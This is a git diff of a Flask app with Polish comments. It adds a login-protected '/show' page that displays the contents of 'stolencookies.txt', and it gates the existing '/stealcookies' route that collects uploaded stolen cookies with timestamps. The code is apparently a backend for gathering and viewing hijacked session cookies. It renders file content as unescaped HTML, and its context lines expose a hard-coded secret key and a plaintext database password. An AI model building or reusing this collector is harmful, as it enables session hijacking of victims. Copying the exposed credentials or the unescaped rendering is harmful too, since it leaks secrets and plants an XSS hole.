@@ -10,34 +10,70 @@ app.secret_key = 'Jakub Mazurek'
 external_database_url = 'postgres://pygenius_security_db_user:2nUg1JYDa5Fgjw0lhOFfNt7ROpKkPSgO@dpg-cp1t92821fec738hjbk0-a.oregon-postgres.render.com/pygenius_security_db'
 
 
+@app.route('/show')
+def show():
+    if 'logged_in' in session and session['logged_in']:
+        file_path = './uploads/stolencookies.txt'
 
+        try:
+            with open(file_path, 'r') as file:
+                # Odczytanie całej zawartości pliku
+                text = file.read()
 
+                # Podzielenie zawartości na linie
+                lines = text.split('\n')
+
+                # Zmienna do przechowywania HTML
+                html_content = ''
+
+                for line in lines:
+                    # Sprawdzenie, czy linia zawiera datę zaktualizowania
+                    if line.startswith('Data zaktualizowania:'):
+                        # Dodanie daty do HTML
+                        html_content += f'<p><strong>{line}</strong></p>'
+                    else:
+                        # Dodanie zawartości linii do HTML
+                        html_content += f'<p>{line}</p>'
+
+            # Renderowanie szablonu HTML i przekazanie zmiennej html_content
+            return render_template('files.html', html_content=html_content)
+
+        except FileNotFoundError:
+            return f'Plik {file_path} nie został odnaleziony.'
+
+        except IOError as e:
+            return f'Błąd odczytu pliku: {e}'
+    else:
+        return redirect(url_for('login'))
 @app.route('/stealcookies', methods=['GET', 'POST'])
 def steal_cookies():
-    if request.method == 'POST':
-        if 'fileToUpload' in request.files:
-            uploaded_file = request.files['fileToUpload']
-            file_contents = uploaded_file.read().decode('utf-8')
-            
-            # Pobierz aktualną datę i czas
-            now = datetime.datetime.now()
-            formatted_date = now.strftime("%Y-%m-%d %H:%M:%S")
-            
-            # Ścieżka do pliku
-            file_path = './uploads/stolencookies.txt'
-            
-            # Zapisz zawartość pliku, dodając nową linię i datę zaktualizowania
-            with open(file_path, 'a') as f:
-                f.write('\n')  # Nowa linia przed nową zawartością
-                f.write(f'Data zaktualizowania: {formatted_date}\n')
-                f.write(file_contents)
-            
-            return 'Plik został pomyślnie zapisany jako stolencookies.txt.'
-        else:
-            return 'Brak przesłanego pliku lub wystąpił problem podczas zapisu.'
-    
-    # Obsługa GET (renderowanie formularza)
-    return render_template('stealcookies.html')
+    if 'logged_in' in session and session['logged_in']:
+        if request.method == 'POST':
+            if 'fileToUpload' in request.files:
+                uploaded_file = request.files['fileToUpload']
+                file_contents = uploaded_file.read().decode('utf-8')
+                
+                # Pobierz aktualną datę i czas
+                now = datetime.datetime.now()
+                formatted_date = now.strftime("%Y-%m-%d %H:%M:%S")
+                
+                # Ścieżka do pliku
+                file_path = './uploads/stolencookies.txt'
+                
+                # Zapisz zawartość pliku, dodając nową linię i datę zaktualizowania
+                with open(file_path, 'a') as f:
+                    f.write('\n')  # Nowa linia przed nową zawartością
+                    f.write(f'Data zaktualizowania: {formatted_date}\n')
+                    f.write(file_contents)
+                
+                return 'Plik został pomyślnie zapisany jako stolencookies.txt.'
+            else:
+                return 'Brak przesłanego pliku lub wystąpił problem podczas zapisu.'
+        
+        # Obsługa GET (renderowanie formularza)
+        return render_template('stealcookies.html')
+    else:
+        return redirect(url_for('login'))
 
 @app.route('/logout_user')
 def logout_user():
